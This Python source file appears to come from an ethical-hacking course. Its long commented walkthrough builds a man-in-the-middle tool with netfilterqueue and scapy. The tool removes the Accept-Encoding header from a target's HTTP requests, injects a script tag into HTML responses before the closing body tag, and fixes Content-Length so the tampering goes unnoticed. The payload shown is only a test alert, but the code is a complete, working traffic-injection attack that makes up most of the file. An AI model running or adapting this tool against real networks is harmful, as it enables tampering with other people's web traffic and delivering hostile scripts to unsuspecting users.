# ●In the last section, we built a program that we can use to intercept downloads and
# # replace any file
# ●This was an example of modifying http packets as they flow through our computer
# But in this example, instead of creating a new response like we did in previous section, we are going
# to modify the data sent in the raw layer
# So by the end of this section, we will understand how to modify anything that gets sent in raw layer
# In this example we will be modifying html code - thus we will build a program which can be used to modify any part of
# any web page loaded by our target and we will also be injecting javascript code in the
# target web page and see how dangerous it is

# 1) This program is going to work similar to the way that Replace downloads - file interceptor program was working.
# So it will be able to see the requests and responses
# -> Instead of creating a new response, we are going to modify parts of response,so that we can modify parts of html code that will be sent to the
# target

# 2) Run the iptables rules, so that packets are redirected to nfqueue
#
# 3) Run the code injector program
# -> Observation: Html code in inspect page and in raw/load of scapy output in response looks different
# Reason:
# a) If we look at the load of the request for this response we can see
# a field called accept-encoding and the value of this field is gzip, deflate
# -> This means that in the request we are saying that we want a website called bing.com and in the same request
# we are saying, that " i can accept GZIP encoding"
# -> So the server is going to receive this and it is going to see that the browser which is us, is able to understand gzip
# encoding - an encoding technique to compress html code
# -> Therefore when the server wants to send us the response, it will first compress the response to a gzip format, send it to us, Hence we
# see the response as bytes
#
# Request
# ###[Raw] ####
# load = 'GET /HTTP/1.1'.... \nAccept-Encoding: gzip,deflate\r\n Connection: keep-alive
# ....
#
# Response
# ###[Raw] ####
# load = '\xfd\xe3\xb7.......'

# 4) Browser will decode this to html code which it  can understand
# -> This is a problem for us, because we cant inject anything into it
# unless we can read the code
#
# 5) Thus the first step in our program will be decoding this and getting the html code in plain
# text instead of reading it in gzip format
# -> Thus our goal is to convert gzip html code to a plain text html code, so that we can read it and modify it
# -> If we modify the load of request and remove Accept-Encoding: gzip then browser will
# think that we cannot understand gzip format and it will send us the data in plain text html code
# -> We can do the same with the help of regex
#
# -> To filter accept encoding of type: "Accept:Encoding: gzip,deflate\r\n"
# -> Regex Expression: Accept-Encoding:.*?\\r\\n
#
# 6) Now we will use python program to filter the text based on the regex expression
# -> re is regex module
# import re
# re.sub("Accept-Encoding:.*?\\r\\n","", scapy_packet[scapy.Raw].load)
# -> Here replace text is given as empty

# 7) create new packet with the modified load and
# modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
# new_packet = set_load(scapy_packet, modified_load)
# packet.set_payload(str(new_packet))

# -> Thus code until now: whenever it finds a text , that matches the regex in its load, it will remove all of this and the
# result of this is the webserver is going to think that - we dont understand gzip encoding and therefore
# server will send us back the html code in plain text

# 8) Now run 1code-injector.py in kali machine , go to bing.com and we can see in kali machine program output 1-code-injector.py output -> in plain text
#

#9) So far using our code, we are able to see requests and responses and we are even
# able to see plaintext of html code of the pages, that person is loading
#
# Also we are able to see that HTML code is being sent in the load field of the raw layer of
# each response packet.

# 10) Now we will inject a javascript code that will only show an alert on screen
# -> script that we will execute : <script>alert('test')</script>;
# -> We can put the script in the last tag. Mostly <body> is the last tag
# in html code
# -> Also <body> tag will occur only once while other tags repeat
# -> If we insert javascript code at the end, page will get loaded first and then
# javascript code gets executed, so that it wont delay the page and user wont
# get suspicious


# 11) We will use .replace() of python while handling response
# -> Then we create new packet from modified load and set the payload
# modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test')</script></body>")
# new_packet = set_load(scapy_packet, modified_load)
# packet.set_payload(str(new_packet))
#
# 12) Now if we run our code 1code-injector.py in kali machie and run bing.com, we will
# get an alert in browser once the page loads, which means the javascript code that we injected got executed in the target page

########new#########
# 13) lets refactor this code
# -> Create new variable for load and use it wherever needed
# load = scapy_packet[scapy.Raw].load
# # modified_load is redundant and we can reuse load for it
# load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
# -> We have repeated code here:
# new_packet = set_load(scapy_packet, load)
# packet.set_payload(str(new_packet))
# --> To avoid repetitive code we check for load gets modified and then execute those statements
# if load != scapy_packet[scapy.Raw].load:
#     new_packet = set_load(scapy_packet, load)
#     packet.set_payload(str(new_packet))

#-> Now after refactoring check if the code works fine by going to bing.com and see if alert comes

# 14) If our page has content length and if we insert something in html, webserver will not
# load the page, since it will think that there is something faulty
# -> So to insert something in the html code, we need to modify the value of content length
# in our code and make sure this value corresponds to the latest size of the page
# after our code injection
#
# -> We will user regex expression: Content-Length:\s\d*
#
# content_length_search = re.search("Content-Length:\s\d*",load)
#
# 15) Since some responses wont contain content length , we need to
# make sure that the search did not return the result
# -> we will check if content length search is successful and if successful, create new variable
# content_length
# -> We will get from content_length_search.group(0)
# --> here group(0) means the first thing that you match out of the whole string
# content_length_search = re.search("Content-Length:\s\d*", load)
# if content_length_search:
#     content_length = content_length_search.group(0)
#     print(content_length)


# 16. Now run the 2code-injectorrefactored.py in kali machine  and refresh web page in kali machine now we can see the content length getting printed
# -> Now we need to separate regular expression into two groups
# a) group1 - First group is a non capturing group - this group can be used to locate the string which is important for me , But i dont want it to be part of the value that i capture
# -> to do that in regex we need to put a ? followed by :
#
#     content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
#
# This will tell Python to look for something that is called content length followed by colon, but dont include that in the output you capture
#
# b) group2 : now we will be able to access second group  by saying group1
#
# if content_length_search:
#     content_length = content_length_search.group(1)
#
#     -> group 1 will only return the actual number: content-length
#
# 17. Now if we run the code , we will get only content length number in the output
# -> This is important because we will be using this number, to recalculate the content length
#
# 18) Now cut this: <script>alert('test')</script> and put it in a variable
#
# injection_code = "<script>alert('test')</script>"
# load = load.replace("</body>", injection_code + "</body>")
#
# 19) Now calculate the new content length
#
# new_content_lenght = content_length + len(injection_code)
#
# 20) now change load to account for the new content length
#
# if content_length_search:
#     content_length = content_length_search.group(1)
# new_content_length = int(content_length) + len(injection_code)
# load = load.replace(content_length, str(new_content_length))
#
# 21) Now we need not reset the packet or set the payload of the packet because this :if statement present already will automatically detect that the load has been modified
# -> if load has been modified, it will set the payload in my packet to the new load and everything should work as expected
#
# if load != scapy_packet[scapy.Raw].load:
#     new_packet = set_load(scapy_packet, load)
# packet.set_payload(str(new_packet))
#


# 22) now to test the same, run the file in kali linux and open the browser for winzip.com
#     -> Now we will be able to see the alert shown in the site

# 23) For situations where a problem: Server may be sending a text or a javascript or a CSS or an image with a content length header
# -> If it is an image, it will not have a body tag and therefore my javascript will not be injected and i will be having incorrect content length
# -> Because my code will recalculate the content length assuming that javascript code is injected
#
# 24) if we check a http response,
# -> Response will say that content type is text/html
# ->We can copy this content type and go to if statement and additional condition for "text/html" is present in load
#
# if content_length_search and "text/html" in load:

# 25) Now if we test this again, go to bing.com in kali linux, we can see that alert is thrown


#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import re




def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport ==80:
            print("HTTP response")
            print(scapy_packet.show())
            injection_code = "<script>alert('test')</script>"
            load = load.replace("</body>",injection_code+ "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length)+ len(injection_code)
                load = load.replace(content_length, str(new_content_length))
                print(content_length)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet,load )
            packet.set_payload(str(new_packet))


    packet.accept()



queue= netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
